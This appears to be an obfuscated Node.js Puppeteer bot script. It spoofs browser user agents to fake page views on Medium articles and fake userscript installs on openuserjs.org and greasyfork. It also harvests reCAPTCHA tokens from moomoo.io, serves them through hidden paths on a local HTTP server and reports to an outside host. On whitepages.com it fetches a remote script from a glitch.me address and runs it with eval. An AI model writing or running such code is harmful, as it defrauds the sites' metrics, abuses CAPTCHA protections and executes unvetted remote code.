      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Z(0x22) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + Z(0x19) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + a0(0x5) + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + Z(0x8) + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + Z(0x1e),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    Z(0x0) + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + Y(0x13, 'WI8f') + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + a0(0xa) + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xfce * -0x2 + 0x1 * -0x1499 + 0x3435
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x10a3 * -0x1 + -0x187f + 0x2922);
    let h = e[f];
    if (b['SmcMXc'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2c8 + 0x1a9e + -0x1d66, s, t, u = 0xb05 + 0x39 * 0x10 + 0xe95 * -0x1; t = n['charAt'](u++); ~t && (s = r % (-0x1 * 0xa3d + -0x193c + -0x5 * -0x719) ? s * (-0x1 * -0x1d59 + -0x1 * 0x853 + 0xa63 * -0x2) + t : t, r++ % (0xc * 0x20e + -0xd68 + -0x2 * 0x59e)) ? p += String['fromCharCode'](0x26b * -0x1 + 0x1 * 0x5d3 + 0x1 * -0x269 & s >> (-(0xbed + 0x16cd + 0x1 * -0x22b8) * r & 0x53 * -0x17 + -0x1cd0 + 0x1e9 * 0x13)) : -0x1b87 + -0x11d7 + 0x2d5e) {
          t = o['indexOf'](t);
        }
        for (let v = 0x9a3 * 0x2 + -0x2cf * 0xb + 0xb9f * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1107 + -0x20fb + 0x1004))['slice'](-(0x1f6 * -0x11 + 0xd4f * 0x1 + 0x1409));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1588 + -0x1328 + -0x260,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x15b6 + -0x6ad + -0xf09; u < -0x3fb + -0x1c71 + 0x216c; u++) {
          p[u] = u;
        }
        for (u = 0x26e1 + -0x26b9 + 0x5 * -0x8; u < -0x4 * -0x29c + 0x4a * 0x25 + -0x1422; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xb * -0x6d + -0x889 + 0xe38), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0xbcf + -0x1d69 * 0x1 + 0x2 * 0x8cd, q = -0x1 * 0x144e + 0x2 * -0xa03 + 0x2854;
        for (let v = 0xb66 + 0x365 + -0xecb; v < n['length']; v++) {
          u = (u + (0x2329 * -0x1 + -0xb03 * 0x1 + 0x2e2d)) % (-0x5 * 0x6a3 + -0x19 * 0x11b + 0x3dd2), q = (q + p[u]) % (-0x4b * -0x2c + 0x21 * 0x12e + -0x1969 * 0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xbf * 0x2 + 0x23 * 0x115 + -0x7 * 0x57b)]);
        }
        return t;
      };
      b['wbTaHD'] = m, c = arguments, b['SmcMXc'] = !![];
    }
    const j = e[0x1768 + 0x1 * -0x1511 + -0x257],
      k = f + j,
      l = c[k];
    return !l ? (b['knjoNt'] === undefined && (b['knjoNt'] = !![]), h = b['wbTaHD'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x4b * 0x7f + 0x263a + -0x4b6f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xa * 0x33e + 0x1d0 * 0xb + 0xce0), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1041 + -0x2 * 0x12a0 + -0x15 * -0x291), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a1 = d,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x183 * 0x9 + 0x1de7 + 0x1 * -0x2b82;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1e08 + 0xb2c + -0x2934; w < getRandomInt(-0xaa8 * -0x2 + 0x218d + -0x36dc, 0xdce + 0x1adc * -0x1 + 0xd13); w++)
            await u['keyboard'][a1(0x4)]('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * -0x6f7d + -0x34ef * 0x3 + 0x119b0);
        }
      }();
    }, 0x7e2 + -0x481 + -0x2fd), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x11db * 0x2 + 0xe3 * -0x20 + -0x756;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags[a2(0x10)]) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x781 * 0x5 + 0x21 * 0x7f + 0x1526, 0x22cd * 0x1 + 0x1de6 + -0x4081)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb2b7 * 0x1 + 0x1 * -0xe3f + -0x2f48);
    }, -0x2b3 * -0x3 + -0x686 + 0x65 * -0x3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x13fa + -0xbe1 * -0x3 + -0xfa9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x3 * -0x251 + 0x2215 * -0x1 + 0x34c * 0x10), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x10af + -0x2 * 0x1066 + -0x35 * -0xef), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x5 * 0x3c05b + -0x1 * 0x119af2 + 0x321859);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x5 * 0x5f9 + 0x1 * 0x61d + 0x1824);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1655 + -0x1366 + 0x2a83);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x25 * 0xcf + 0x35f2 + -0x1 * 0x344d);
}
doFlags['doOUJS'] && ((async () => {
  const a7 = b,
    a6 = c;
  async function f() {
    const a5 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x12ed + -0x1c2e + 0x2f1c) {
        const a4 = d,
          a3 = c;
        if (A['includes'](a3(0xf)))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1d2f * 0x1 + 0x2515 + -0x4243));
        const C = A['indexOf'](a4(0x20)) + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x2 * -0x928 + -0x268e + 0x38de, D['indexOf']('\x20'));
        return B ? E['slice'](0x1555 + 0x1 * 0x7bf + -0x2 * 0xe8a, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2bb1 * 0x1 + -0xa1d * -0x1 + -0x48a4 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x[a5(0x1b)])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xb94 + 0x1b7d + -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + a6(0x3) + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + a6(0x1f) + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a7(0x15, 'qVVy') + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
